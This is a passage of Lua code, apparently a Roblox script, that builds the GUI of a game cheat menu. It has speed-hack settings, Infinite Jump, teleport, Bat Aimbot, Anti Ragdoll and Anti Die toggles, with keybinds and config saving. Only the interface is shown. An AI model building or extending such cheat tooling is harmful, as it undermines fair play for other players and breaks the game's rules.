	box.TextSize = isMobile and 9 or 11
	box.Font = Enum.Font.FredokaOne
	box.ClearTextOnFocus = false
	box.Parent = boxFrame
	box.FocusLost:Connect(function()
	local number = tonumber(box.Text)
	if number then callback(number); box.Text = tostring(number) else box.Text = tostring(value) end
	end)
	return row
	end
	local function customSpeedRow(parent, customSpeed, order)
	local row = Instance.new("Frame")
	row.Name = "CustomSpeed_" .. customSpeed.name
	row.Size = UDim2.new(1, 0, 0, 58)
	row.BackgroundColor3 = Color3.fromRGB(14, 8, 16)
	row.BackgroundTransparency = 0.08
	row.BorderSizePixel = 0
	row.LayoutOrder = order
	row.Parent = parent
	corner(row, 12)
	local rowStroke = stroke(row, C.accentDim, 1.2)
	rowStroke.Transparency = 0.45

	local selectedMarker = Instance.new("Frame")
	selectedMarker.Size = UDim2.new(0, 3, 0, 36)
	selectedMarker.Position = UDim2.new(0, 4, 0.5, -18)
	selectedMarker.BackgroundColor3 = C.accent
	selectedMarker.BorderSizePixel = 0
	selectedMarker.Parent = row
	corner(selectedMarker, 2)

	local selectButton = keepOriginalText(Instance.new("TextButton"))
	selectButton.Size = UDim2.new(0, 88, 1, 0)
	selectButton.Position = UDim2.new(0, 12, 0, 0)
	selectButton.BackgroundTransparency = 1
	selectButton.Text = customSpeed.name
	selectButton.TextColor3 = C.text
	selectButton.TextSize = 11
	selectButton.Font = Enum.Font.FredokaOne
	selectButton.TextXAlignment = Enum.TextXAlignment.Left
	selectButton.Parent = row
	local customFeatureName = "SelectCustomMode_" .. customSpeed.name
	inlineModeBind(row, customFeatureName, UDim2.fromOffset(106, 19))

	local function speedBox(labelText, value, xPosition, onChanged)
	local label = keepOriginalText(Instance.new("TextLabel"))
	label.Size = UDim2.fromOffset(54, 14)
	label.Position = UDim2.fromOffset(xPosition, 5)
	label.BackgroundTransparency = 1
	label.Text = labelText
	label.TextColor3 = C.textMuted
	label.TextSize = 8
	label.Font = Enum.Font.FredokaOne
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.Parent = row
	local box = keepOriginalText(Instance.new("TextBox"))
	box.Size = UDim2.fromOffset(54, 22)
	box.Position = UDim2.fromOffset(xPosition, 24)
	box.BackgroundColor3 = C.bgDark
	box.BorderSizePixel = 0
	box.Text = tostring(value)
	box.TextColor3 = C.text
	box.TextSize = 10
	box.Font = Enum.Font.FredokaOne
	box.ClearTextOnFocus = false
	box.Parent = row
	corner(box, 5); stroke(box, Color3.fromRGB(55, 55, 60), 1)
	box.FocusLost:Connect(function()
	local number = tonumber(box.Text)
	if not number then box.Text = tostring(value); return end
	number = math.clamp(math.floor(number + 0.5), 1, 200)
	value = number
	box.Text = tostring(number)
	onChanged(number)
	end)
	return box
	end

	speedBox("NORMAL", customSpeed.boost, 158, function(value)
	customSpeed.boost = value
	speedValues["CustomBoost_" .. customSpeed.name] = value
	saveConfig()
	pcall(function() if _G.__refreshSpeedBillboards then _G.__refreshSpeedBillboards() end end)
	end)
	speedBox("CARRY", customSpeed.steal, 224, function(value)
	customSpeed.steal = value
	speedValues["CustomSteal_" .. customSpeed.name] = value
	saveConfig()
	pcall(function() if _G.__refreshSpeedBillboards then _G.__refreshSpeedBillboards() end end)
	end)

	local deleteButton = keepOriginalText(Instance.new("TextButton"))
	deleteButton.Size = UDim2.fromOffset(30, 24)
	deleteButton.Position = UDim2.new(1, -40, 0.5, -12)
	deleteButton.BackgroundColor3 = Color3.fromRGB(72, 34, 34)
	deleteButton.BorderSizePixel = 0
	deleteButton.Text = "X"
	deleteButton.TextColor3 = Color3.fromRGB(255, 180, 180)
	deleteButton.TextSize = 10
	deleteButton.Font = Enum.Font.FredokaOne
	deleteButton.Parent = row
	corner(deleteButton, 5)

	local function updateVisual()
	local active = selectedMode == customSpeed.name
	row.BackgroundTransparency = active and 0.28 or 0.5
	selectedMarker.Visible = active
	end
	selectButton.MouseButton1Click:Connect(function()
	selectMode(customSpeed.name)
	end)
	deleteButton.MouseButton1Click:Connect(function()
	for index = #customSpeeds, 1, -1 do
	if customSpeeds[index] == customSpeed then table.remove(customSpeeds, index); break end
	end
	speedValues["CustomBoost_" .. customSpeed.name] = nil
	speedValues["CustomSteal_" .. customSpeed.name] = nil
	FeatureKeybinds[customFeatureName] = nil
	FeatureToggles[customFeatureName] = nil
	if selectedMode == customSpeed.name then selectMode("Normal") end
	row:Destroy()
	saveConfig()
	end)
	FeatureToggles[customFeatureName] = function() selectMode(customSpeed.name) end
	table.insert(_speedCardRefs, { modeName = customSpeed.name, updateVisual = updateVisual })
	updateVisual()
	return row
	end

	local function customSpeedForm(parent, order, onCreated)
	local form = Instance.new("Frame")
	form.Name = "CustomSpeedForm"
	form.Size = UDim2.new(1, 0, 0, 112)
	form.BackgroundColor3 = C.row
	form.BackgroundTransparency = 0.2
	form.BorderSizePixel = 0
	form.LayoutOrder = order
	form.Parent = parent
	corner(form, 10); stroke(form, C.divider, 1)

	local function formLabel(text, x, width)
	local label = keepOriginalText(Instance.new("TextLabel"))
	label.Size = UDim2.fromOffset(width, 14)
	label.Position = UDim2.fromOffset(x, 8)
	label.BackgroundTransparency = 1
	label.Text = text
	label.TextColor3 = C.textMuted
	label.TextSize = 8
	label.Font = Enum.Font.FredokaOne
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.Parent = form
	end
	local function formBox(defaultText, x, width)
	local box = keepOriginalText(Instance.new("TextBox"))
	box.Size = UDim2.fromOffset(width, 24)
	box.Position = UDim2.fromOffset(x, 24)
	box.BackgroundColor3 = C.bgDark
	box.BorderSizePixel = 0
	box.Text = defaultText
	box.TextColor3 = C.text
	box.TextSize = 10
	box.Font = Enum.Font.FredokaOne
	box.ClearTextOnFocus = false
	box.Parent = form
	corner(box, 5); stroke(box, Color3.fromRGB(55, 55, 60), 1)
	return box
	end
	formLabel("NAME", 12, 150)
	formLabel("NORMAL", 174, 70)
	formLabel("CARRY", 256, 70)
	local nameBox = formBox("Custom " .. tostring(#customSpeeds + 1), 12, 150)
	local normalBox = formBox("59", 174, 70)
	local carryBox = formBox("29", 256, 70)
	local errorLabel = keepOriginalText(Instance.new("TextLabel"))
	errorLabel.Size = UDim2.new(1, -24, 0, 14)
	errorLabel.Position = UDim2.new(0, 12, 1, -20)
	errorLabel.BackgroundTransparency = 1
	errorLabel.Text = ""
	errorLabel.TextColor3 = Color3.fromRGB(255, 150, 150)
	errorLabel.TextSize = 8
	errorLabel.Font = Enum.Font.FredokaOne
	errorLabel.TextXAlignment = Enum.TextXAlignment.Left
	errorLabel.Parent = form
	local addButton = keepOriginalText(Instance.new("TextButton"))
	addButton.Size = UDim2.new(1, -24, 0, 26)
	addButton.Position = UDim2.new(0, 12, 0, 62)
	addButton.BackgroundColor3 = C.accentDim
	addButton.BorderSizePixel = 0
	addButton.Text = "CREATE CUSTOM SPEED"
	addButton.TextColor3 = C.text
	addButton.TextSize = 10
	addButton.Font = Enum.Font.FredokaOne
	addButton.Parent = form
	corner(addButton, 6)
	addButton.MouseButton1Click:Connect(function()
	local name = nameBox.Text:match("^%s*(.-)%s*$")
	local normal = tonumber(normalBox.Text)
	local carry = tonumber(carryBox.Text)
	if not name or #name < 1 then errorLabel.Text = "Escribe un nombre."; return end
	if name:find("[:,=]") then errorLabel.Text = "El nombre no puede contener : , o =."; return end
	if name == "Normal" or name == "Lagger" or name == "Desync" then errorLabel.Text = "Ese nombre está reservado."; return end
	for _, item in ipairs(customSpeeds) do if item.name == name then errorLabel.Text = "Ese nombre ya existe."; return end end
	if not normal or normal < 1 or normal > 200 then errorLabel.Text = "Normal: elige un valor entre 1 y 200."; return end
	if not carry or carry < 1 or carry > 200 then errorLabel.Text = "Carry: elige un valor entre 1 y 200."; return end
	local customSpeed = { name = name, boost = math.floor(normal + 0.5), steal = math.floor(carry + 0.5) }
	table.insert(customSpeeds, customSpeed)
	speedValues["CustomBoost_" .. name] = customSpeed.boost
	speedValues["CustomSteal_" .. name] = customSpeed.steal
	saveConfig()
	form:Destroy()
	onCreated(customSpeed)
	end)
	return form
	end
	local function toggleRow(parent, labelText, featureName, initial, order, hasKeybind, callback, bindFeatureName)
	local rowH = hasKeybind and (isMobile and 52 or 58) or (isMobile and 44 or 48)
	local row = Instance.new("Frame")
	row:SetAttribute("CandyVSButtonThemeControl", true)
	row.Size = UDim2.new(1, 0, 0, rowH)
	row.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	row.BackgroundTransparency = 0.08
	row.BorderSizePixel = 0
	row.ClipsDescendants = true
	row.LayoutOrder = order
	row.Parent = parent
	corner(row, 18)
	local rowStroke = stroke(row, Color3.fromRGB(255, 160, 40), 2)
	rowStroke.Transparency = 0.35
	local rowScale = Instance.new("UIScale", row)
	rowScale.Scale = 1
	local activeMarker = Instance.new("Frame")
	activeMarker.Name = "ActiveMarker"
	activeMarker.Size = UDim2.new(0, 4, 0, 22)
	activeMarker.Position = UDim2.new(0, 8, 0.5, -11)
	activeMarker.BackgroundColor3 = C.accent
	activeMarker.BorderSizePixel = 0
	activeMarker.Parent = row
	corner(activeMarker, 4)
	local label = keepOriginalText(Instance.new("TextLabel"))
	label.Size = UDim2.new(1, hasKeybind and -130 or -90, 0, hasKeybind and 20 or rowH)
	label.Position = UDim2.new(0, 20, 0, hasKeybind and 6 or 0)
	label.BackgroundTransparency = 1
	label.Text = labelText
	label.TextColor3 = Color3.fromRGB(255, 255, 255)
	label.TextSize = isMobile and 13 or 14
	label.Font = Enum.Font.FredokaOne
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.Parent = row
	local keyFeatureName = bindFeatureName or featureName
	if hasKeybind and keyFeatureName then
	local bind = keepOriginalText(Instance.new("TextButton"))
	bind.Size = UDim2.new(0, isMobile and 40 or 46, 0, isMobile and 18 or 20)
	bind.Position = UDim2.new(0, 20, 1, isMobile and -22 or -24)
	bind.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	bind.BackgroundTransparency = 0.15
	bind.BorderSizePixel = 0
	local key = FeatureKeybinds[keyFeatureName]
	bind.Text = key and keybindDisplayName(key) or "-"
	bind.TextColor3 = C.text
	bind.TextSize = isMobile and 9 or 10
	bind.Font = Enum.Font.FredokaOne
	bind.Parent = row
	corner(bind, 8)
	stroke(bind, C.divider, 1)
	bind.MouseButton1Click:Connect(function() beginKeybind(bind, keyFeatureName) end)
	table.insert(_allBindBtns, bind)
	end
	local switchBtn = Instance.new("TextButton")
	switchBtn.Name = "ToggleSwitch"
	switchBtn.Size = UDim2.new(0, 54, 0, 28)
	switchBtn.Position = UDim2.new(1, -64, 0.5, -14)
	switchBtn.BackgroundColor3 = Color3.fromRGB(35, 20, 8)
	switchBtn.BorderSizePixel = 0
	switchBtn.Text = ""
	switchBtn.AutoButtonColor = false
	switchBtn.ZIndex = 5
	switchBtn.Parent = row
	corner(switchBtn, 14)
	local switchStroke = stroke(switchBtn, Color3.fromRGB(220, 160, 60), 1.5)
	switchStroke.Transparency = 0.25
	local knob = Instance.new("Frame")
	knob.Name = "Knob"
	knob.Size = UDim2.new(0, 24, 0, 24)
	knob.Position = UDim2.new(0, 2, 0.5, -12)
	knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	knob.BorderSizePixel = 0
	knob.ZIndex = 6
	knob.Parent = switchBtn
	corner(knob, 12)
	local active = initial == true
	local function updateVisual(value)
	active = value == true
	switchBtn.BackgroundColor3 = active and C.accent or Color3.fromRGB(35, 20, 8)
	knob.Position = active and UDim2.new(1, -26, 0.5, -12) or UDim2.new(0, 2, 0.5, -12)
	activeMarker.BackgroundTransparency = active and 0 or 0.7
	activeMarker.BackgroundColor3 = C.accent
	rowStroke.Color = active and C.accent or Color3.fromRGB(255, 160, 40)
	rowStroke.Transparency = active and 0.15 or 0.35
	end
	updateVisual(active)
	local function fireToggle()
	rowScale.Scale = 0.985
	tween(rowScale, {Scale = 1}, 0.18, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
	local desired = not active
	callback(desired)
	updateVisual(featureName and toggleStates[featureName] == true or desired)
	end
	switchBtn.MouseButton1Click:Connect(fireToggle)
	local hit = Instance.new("TextButton")
	keepOriginalText(hit)
	hit.Size = UDim2.new(1, -70, 1, 0)
	hit.BackgroundTransparency = 1
	hit.Text = ""
	hit.ZIndex = 1
	hit.Parent = row
	hit.MouseButton1Click:Connect(fireToggle)
	if featureName then
	toggleVisualUpdaters[featureName] = function() updateVisual(toggleStates[featureName] == true) end
	end
	return updateVisual, row
	end
	local function modeButton(row, initialText, callback)
	local button = keepOriginalText(Instance.new("TextButton"))
	button.Size = UDim2.new(0, isMobile and 58 or 68, 0, isMobile and 26 or 28)
	button.Position = UDim2.new(1, isMobile and -68 or -78, 0.5, isMobile and -13 or -14)
	button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	button.BackgroundTransparency = 0.1
	button.BorderSizePixel = 0
	button.Text = initialText
	button.TextColor3 = Color3.fromRGB(255, 255, 255)
	button.TextSize = isMobile and 11 or 12
	button.Font = Enum.Font.FredokaOne
	button.ZIndex = 8
	button.Parent = row
	corner(button, 12); stroke(button, C.accent, 1.5)
	local buttonScale = Instance.new("UIScale", button)
	buttonScale.Scale = 1
	button.MouseButton1Click:Connect(function()
	buttonScale.Scale = 0.92
	tween(buttonScale, {Scale = 1}, 0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
	local newText = callback()
	if newText then button.Text = tostring(newText) end
	end)
	return button
	end
	local function actionRow(parent, labelText, featureName, order, action)
	local row = Instance.new("Frame")
	row:SetAttribute("CandyVSButtonThemeControl", true)
	row.Size = UDim2.new(1, 0, 0, MODERN.actionH)
	row.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	row.BackgroundTransparency = 0.08
	row.BorderSizePixel = 0
	row.LayoutOrder = order
	row.Parent = parent
	corner(row, 18); stroke(row, Color3.fromRGB(255, 160, 40), 2)
	local rowScale = Instance.new("UIScale", row)
	rowScale.Scale = 1
	local label = keepOriginalText(Instance.new("TextButton"))
	label.Size = UDim2.new(1, featureName and -64 or -24, 1, 0)
	label.Position = UDim2.new(0, isMobile and 8 or 12, 0, 0)
	label.BackgroundTransparency = 1
	label.Text = labelText
	label.TextColor3 = C.text
	label.TextSize = MODERN.textSize
	label.Font = Enum.Font.FredokaOne
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.Parent = row
	label.MouseButton1Click:Connect(function()
	rowScale.Scale = 0.985
	tween(rowScale, {Scale = 1}, 0.18, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
	action()
	end)
	if featureName then
	local bind = keepOriginalText(Instance.new("TextButton"))
	bind.Size = UDim2.new(0, isMobile and 38 or 44, 0, isMobile and 18 or 22)
	bind.Position = UDim2.new(1, isMobile and -45 or -54, 0.5, isMobile and -9 or -11)
	bind.BackgroundColor3 = C.accentDim
	bind.BackgroundTransparency = 0.35
	bind.BorderSizePixel = 0
	local key = FeatureKeybinds[featureName]
	bind.Text = key and keybindDisplayName(key) or "-"
	bind.TextColor3 = C.text
	bind.TextSize = isMobile and 8 or 9
	bind.Font = Enum.Font.FredokaOne
	bind.Parent = row
	corner(bind, 5)
	bind.MouseButton1Click:Connect(function() beginKeybind(bind, featureName) end)
	table.insert(_allBindBtns, bind)
	end
	return row
	end

	local movement = pages.Movement
	sectionLabel(movement, "SPEED CONFIGURATION", 0)
	inputRow(movement, "Normal Speed", speedValues.NormalBoost, 1, function(value) speedValues.NormalBoost = math.max(1, math.floor(value)); normalSpeed = speedValues.NormalBoost; saveConfig() end, "SelectNormalMode")
	inputRow(movement, "Carry Speed", speedValues.NormalSteal, 2, function(value) speedValues.NormalSteal = math.max(1, math.floor(value)); carrySpeed = speedValues.NormalSteal; saveConfig() end)
	sectionLabel(movement, "LAGGER SPEED", 3)
	inputRow(movement, "Lagger Normal", speedValues.LaggerBoost, 4, function(value) speedValues.LaggerBoost = math.max(1, math.floor(value)); laggerSpeed = speedValues.LaggerBoost; saveConfig() end, "SelectLaggerMode")
	inputRow(movement, "Lagger Carry", speedValues.LaggerSteal, 5, function(value) speedValues.LaggerSteal = math.max(1, math.floor(value)); saveConfig() end)
	sectionLabel(movement, "CUSTOM SPEEDS", 6)
	local customSpeedRows = {}
	local function addCustomSpeedToMainPanel(customSpeed)
	local row = customSpeedRow(movement, customSpeed, 10 + #customSpeedRows)
	table.insert(customSpeedRows, row)
	return row
	end
	for _, customSpeed in ipairs(customSpeeds) do
	addCustomSpeedToMainPanel(customSpeed)
	end
	local addCustomSpeedButton = keepOriginalText(Instance.new("TextButton"))
	addCustomSpeedButton.Size = UDim2.new(1, 0, 0, 38)
	addCustomSpeedButton.BackgroundColor3 = C.row
	addCustomSpeedButton.BackgroundTransparency = 0.3
	addCustomSpeedButton.BorderSizePixel = 0
	addCustomSpeedButton.LayoutOrder = 50
	addCustomSpeedButton.Text = "+  ADD CUSTOM SPEED"
	addCustomSpeedButton.TextColor3 = C.text
	addCustomSpeedButton.TextSize = 10
	addCustomSpeedButton.Font = Enum.Font.FredokaOne
	addCustomSpeedButton.Parent = movement
	corner(addCustomSpeedButton, 10); stroke(addCustomSpeedButton, C.divider, 1)
	local customSpeedFormOpen = nil
	addCustomSpeedButton.MouseButton1Click:Connect(function()
	if customSpeedFormOpen and customSpeedFormOpen.Parent then
	customSpeedFormOpen:Destroy()
	customSpeedFormOpen = nil
	return
	end
	customSpeedFormOpen = customSpeedForm(movement, 51, function(customSpeed)
	customSpeedFormOpen = nil
	addCustomSpeedToMainPanel(customSpeed)
	selectMode(customSpeed.name)
	end)
	end)
	sectionLabel(movement, "CONTROLS", 60)
	local _, autoplayUiRow = toggleRow(movement, "Auto Play", "Autoplay", toggleStates["Autoplay"], 61, true, function(on) setFeature("Autoplay", on) end)
	modeButton(autoplayUiRow, string.upper(_G.__autoplayMode or "Full"), function()
	_G.__autoplayMode = (_G.__autoplayMode == "Semi") and "Full" or "Semi"
	saveConfig()
	return string.upper(_G.__autoplayMode)
	end)
	toggleRow(movement, "Auto Carry Speed", "Auto Carry Speed", toggleStates["Auto Carry Speed"], 62, false, function(on) setFeature("Auto Carry Speed", on) end)
	local _, carryModeUiRow = toggleRow(movement, "Carry Mode", "Carry Speed", toggleStates["Carry Speed"], 63, true, function(on) setFeature("Carry Speed", on) end)
	modeButton(carryModeUiRow, string.upper(carrySpeedMode or "v1"), function()
	carrySpeedMode = carrySpeedMode == "v1" and "v2" or "v1"
	saveConfig()
	return string.upper(carrySpeedMode)
	end)
	sectionLabel(movement, "MOVEMENT SETTINGS", 70)
	local _, infJumpUiRow = toggleRow(movement, "Infinite Jump", "Inf Jump", toggleStates["Inf Jump"], 71, false, function(on) setFeature("Inf Jump", on) end)
	modeButton(infJumpUiRow, string.upper(_G.__CandyVSInfJumpMode or "hold"), function()
	_G.__CandyVSInfJumpMode = (_G.__CandyVSInfJumpMode or "hold") == "hold" and "manual" or "hold"
	if toggleStates["Inf Jump"] then
	if _G.__CandyVSInfJumpMode == "hold" and startInfJump then
	pcall(startInfJump)
	elseif stopInfJump then
	pcall(stopInfJump)
	end
	end
	saveConfig()
	return string.upper(_G.__CandyVSInfJumpMode)
	end)
	toggleRow(movement, "Unwalk", "Unwalk", toggleStates["Unwalk"], 72, false, function(on)
	setFeature("Unwalk", on)
	end)
	sectionLabel(movement, "TP DOWN", 73)
	actionRow(movement, "TP Down", "TP Down", 74, function()
	if FeatureToggles["TP Down"] then pcall(FeatureToggles["TP Down"]) end
	end)
	toggleRow(movement, "Auto TP Down", "Auto TP Down", toggleStates["Auto TP Down"], 75, false, function(on)
	setFeature("Auto TP Down", on)
	end)
	inputRow(movement, "Height (studs)", speedValues.AutoTPDownHeight, 76, function(value)
	speedValues.AutoTPDownHeight = math.clamp(math.floor(value + 0.5), 1, 1000)
	saveConfig()
	end)

	local combat = pages.Combat
	sectionLabel(combat, "BAT CONTROLS", 0)
	toggleRow(combat, "Bat Aimbot", "Aimbot", toggleStates.Aimbot, 1, true, function(on) setFeature("Aimbot", on) end)
	do
		local verRow = actionRow(combat, "Bat Aimbot Version", nil, 1.5, function() end)
		local verBtn = keepOriginalText(Instance.new("TextButton"))
		verBtn.Name = "BatAimbotVersionPill"
		verBtn.Size = UDim2.new(0, isMobile and 72 or 84, 0, isMobile and 26 or 28)
		verBtn.Position = UDim2.new(1, isMobile and -80 or -92, 0.5, isMobile and -13 or -14)
		verBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		verBtn.BackgroundTransparency = 0.1
		verBtn.BorderSizePixel = 0
		verBtn.Text = "V" .. tostring(_G.__batAimbotVersion or 1)
		verBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
		verBtn.TextSize = isMobile and 11 or 12
		verBtn.Font = Enum.Font.FredokaOne
		verBtn.ZIndex = 8
		verBtn.AutoButtonColor = false
		verBtn.Parent = verRow
		corner(verBtn, 12)
		stroke(verBtn, C.accent, 1.5)
		_G.__batAimbotVersionPill = verBtn
		verRow.ClipsDescendants = false
		local drop = Instance.new("Frame")
		drop.Name = "BatAimbotVersionDrop"
		drop.Size = UDim2.new(0, isMobile and 130 or 150, 0, 0)
		drop.Position = UDim2.new(1, isMobile and -138 or -158, 0, isMobile and 40 or 44)
		drop.BackgroundColor3 = Color3.fromRGB(12, 6, 14)
		drop.BackgroundTransparency = 0.02
		drop.BorderSizePixel = 0
		drop.Visible = false
		drop.ClipsDescendants = false
		drop.ZIndex = 200
		drop.Parent = verRow
		corner(drop, 10)
		stroke(drop, C.accent, 1.2)
		local dropLayout = Instance.new("UIListLayout", drop)
		dropLayout.SortOrder = Enum.SortOrder.LayoutOrder
		dropLayout.Padding = UDim.new(0, 2)
		local dropPad = Instance.new("UIPadding", drop)
		dropPad.PaddingTop = UDim.new(0, 4)
		dropPad.PaddingBottom = UDim.new(0, 4)
		dropPad.PaddingLeft = UDim.new(0, 4)
		dropPad.PaddingRight = UDim.new(0, 4)
		local function setBatAimbotVersion(ver)
			ver = (tonumber(ver) == 2) and 2 or 1
			local prev = _G.__batAimbotVersion or 1
			_G.__batAimbotVersion = ver
			verBtn.Text = "V" .. tostring(ver)
			drop.Visible = false
			drop.Size = UDim2.new(0, isMobile and 120 or 140, 0, 0)
			pcall(saveConfig)
			if toggleStates["Aimbot"] and prev ~= ver then
				if FeaturePostToggle["Aimbot"] then
					pcall(FeaturePostToggle["Aimbot"], false)
					pcall(FeaturePostToggle["Aimbot"], true)
				end
			end
		end
		local options = {
			{ ver = 1, label = "V1  (Current)" },
			{ ver = 2, label = "V2  (New)" },
		}
		for i, opt in ipairs(options) do
			local optBtn = keepOriginalText(Instance.new("TextButton"))
			optBtn.Size = UDim2.new(1, 0, 0, 26)
			optBtn.BackgroundColor3 = Color3.fromRGB(20, 10, 18)
			optBtn.BackgroundTransparency = 0.1
			optBtn.BorderSizePixel = 0
			optBtn.Text = opt.label
			optBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
			optBtn.TextSize = 11
			optBtn.Font = Enum.Font.FredokaOne
			optBtn.LayoutOrder = i
			optBtn.ZIndex = 201
			optBtn.AutoButtonColor = false
			optBtn.Parent = drop
			corner(optBtn, 8)
			optBtn.MouseButton1Click:Connect(function()
				setBatAimbotVersion(opt.ver)
			end)
		end
		verBtn.MouseButton1Click:Connect(function()
			drop.Visible = not drop.Visible
			if drop.Visible then
				drop.Size = UDim2.new(0, isMobile and 120 or 140, 0, 64)
			else
				drop.Size = UDim2.new(0, isMobile and 120 or 140, 0, 0)
			end
		end)
	end
	inputRow(combat, "Aimbot Speed", speedValues.CypherAimbotApproachSpeed, 2, function(value)
		speedValues.CypherAimbotApproachSpeed = math.clamp(math.floor(value + 0.5), 1, 120)
		saveConfig()
	end)
	toggleRow(combat, "Lagger Aimbot", "Lagger Aimbot", toggleStates["Lagger Aimbot"], 3, true, function(on) setFeature("Lagger Aimbot", on) end)
	toggleRow(combat, "Anti Bat", "Anti Bat", toggleStates["Anti Bat"], 4, true, function(on) setFeature("Anti Bat", on) end)
	toggleRow(combat, "Ragdoll Counter", "Ragdoll Counter", toggleStates["Ragdoll Counter"], 5, false, function(on) setFeature("Ragdoll Counter", on) end)
	sectionLabel(combat, "RAGDOLL", 6)
	toggleRow(combat, "Anti Ragdoll", "Anti Ragdoll", toggleStates["Anti Ragdoll"], 7, false, function(on) setFeature("Anti Ragdoll", on) end)
	toggleRow(combat, "Medusa Counter", "Medusa Counter", toggleStates["Medusa Counter"], 8, false, function(on) setFeature("Medusa Counter", on) end)
	toggleRow(combat, "Anti Die", "Anti Die", toggleStates["Anti Die"], 9, false, function(on) setFeature("Anti Die", on) end)
	sectionLabel(combat, "TP BAT", 10)
	local _, tpBatUiRow = toggleRow(combat, "TP Bat", "TP Bat", toggleStates["TP Bat"], 11, false, function(on) setFeature("TP Bat", on) end)
	tpBatUiRow.ClipsDescendants = true

	local tpBatConfigToggle = keepOriginalText(Instance.new("TextButton"))
	tpBatConfigToggle.Name = "TPBatConfigToggle"
	tpBatConfigToggle.Size = UDim2.new(0, isMobile and 52 or 64, 0, isMobile and 18 or 22)
	tpBatConfigToggle.Position = UDim2.new(1, isMobile and -60 or -76, 0, isMobile and 5 or 7)
	tpBatConfigToggle.BackgroundColor3 = C.accentDim
	tpBatConfigToggle.BackgroundTransparency = 0.2
	tpBatConfigToggle.BorderSizePixel = 0
	tpBatConfigToggle.Text = ""
	tpBatConfigToggle.AutoButtonColor = false
	tpBatConfigToggle.ZIndex = 12
	tpBatConfigToggle.Parent = tpBatUiRow
	corner(tpBatConfigToggle, 6); stroke(tpBatConfigToggle, Color3.fromRGB(70, 75, 84), 1)

	local tpBatConfigLabel = keepOriginalText(Instance.new("TextLabel"))
	tpBatConfigLabel.Size = UDim2.new(0, 30, 1, 0)
	tpBatConfigLabel.Position = UDim2.new(0, 5, 0, 0)
	tpBatConfigLabel.BackgroundTransparency = 1
	tpBatConfigLabel.Text = "GUI"
	tpBatConfigLabel.TextColor3 = C.text
	tpBatConfigLabel.TextSize = 8
	tpBatConfigLabel.Font = Enum.Font.FredokaOne
	tpBatConfigLabel.TextXAlignment = Enum.TextXAlignment.Left
	tpBatConfigLabel.ZIndex = 13
	tpBatConfigLabel.Parent = tpBatConfigToggle

	local tpBatConfigTrack = Instance.new("Frame")
	tpBatConfigTrack.Size = UDim2.new(0, 24, 0, 12)
	tpBatConfigTrack.Position = UDim2.new(1, -29, 0.5, -6)
	tpBatConfigTrack.BackgroundColor3 = Color3.fromRGB(30, 31, 35)
	tpBatConfigTrack.BorderSizePixel = 0
	tpBatConfigTrack.ZIndex = 13
	tpBatConfigTrack.Parent = tpBatConfigToggle
	corner(tpBatConfigTrack, 20)
	local tpBatConfigKnob = Instance.new("Frame")
	tpBatConfigKnob.Size = UDim2.new(0, 8, 0, 8)
	tpBatConfigKnob.Position = UDim2.new(0, 2, 0.5, -4)
	tpBatConfigKnob.BackgroundColor3 = Color3.fromRGB(155, 165, 180)
	tpBatConfigKnob.BorderSizePixel = 0
	tpBatConfigKnob.ZIndex = 14
	tpBatConfigKnob.Parent = tpBatConfigTrack
	corner(tpBatConfigKnob, 20)

	local tpBatInlineBind = keepOriginalText(Instance.new("TextButton"))
	tpBatInlineBind.Name = "TPBatInlineKeybind"
	tpBatInlineBind:SetAttribute("MiniUIBind", true)
	tpBatInlineBind.Size = UDim2.new(0, isMobile and 36 or 42, 0, isMobile and 18 or 22)
	tpBatInlineBind.Position = UDim2.new(1, isMobile and -102 or -124, 0, isMobile and 5 or 7)
	tpBatInlineBind.BackgroundColor3 = C.accentDim
	tpBatInlineBind.BackgroundTransparency = 0.25
	tpBatInlineBind.BorderSizePixel = 0
	tpBatInlineBind.Text = FeatureKeybinds["TP Bat"] and keybindDisplayName(FeatureKeybinds["TP Bat"]) or "-"
	tpBatInlineBind.TextColor3 = C.text
	tpBatInlineBind.TextSize = isMobile and 8 or 9
	tpBatInlineBind.Font = Enum.Font.FredokaOne
	tpBatInlineBind.AutoButtonColor = false
	tpBatInlineBind.ZIndex = 12
	tpBatInlineBind.Parent = tpBatUiRow
	corner(tpBatInlineBind, 5); stroke(tpBatInlineBind, Color3.fromRGB(55, 55, 60), 1)
	tpBatInlineBind.MouseButton1Click:Connect(function()
	beginKeybind(tpBatInlineBind, "TP Bat")
	end)
	table.insert(_allBindBtns, tpBatInlineBind)
	local previousTPBatUpdater = toggleVisualUpdaters["TP Bat"]
	toggleVisualUpdaters["TP Bat"] = function()
	if previousTPBatUpdater then pcall(previousTPBatUpdater) end
	local key = FeatureKeybinds["TP Bat"]
	tpBatInlineBind.Text = key and keybindDisplayName(key) or "-"
	tpBatInlineBind.BackgroundColor3 = C.accentDim
	tpBatInlineBind.BackgroundTransparency = 0.25
	tpBatInlineBind.TextColor3 = C.text
	end

	local tpBatConfigPanel = Instance.new("Frame")
	tpBatConfigPanel.Name = "TPBatConfigPanel"
	tpBatConfigPanel.Size = UDim2.new(1, -16, 0, 78)
	tpBatConfigPanel.Position = UDim2.new(0, 8, 0, isMobile and 42 or 54)
	tpBatConfigPanel.BackgroundColor3 = C.bgDark
	tpBatConfigPanel.BackgroundTransparency = 0.16
	tpBatConfigPanel.BorderSizePixel = 0
	tpBatConfigPanel.Visible = false
	tpBatConfigPanel.ZIndex = 8
	tpBatConfigPanel.Parent = tpBatUiRow
	corner(tpBatConfigPanel, 8); stroke(tpBatConfigPanel, C.divider, 1)

	local function tpBatConfigText(text, y)
	local label = keepOriginalText(Instance.new("TextLabel"))
	label.Size = UDim2.new(1, -100, 0, 34)
	label.Position = UDim2.new(0, 10, 0, y)
	label.BackgroundTransparency = 1
	label.Text = text
	label.TextColor3 = C.textMuted
	label.TextSize = 9
	label.Font = Enum.Font.FredokaOne
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.ZIndex = 9
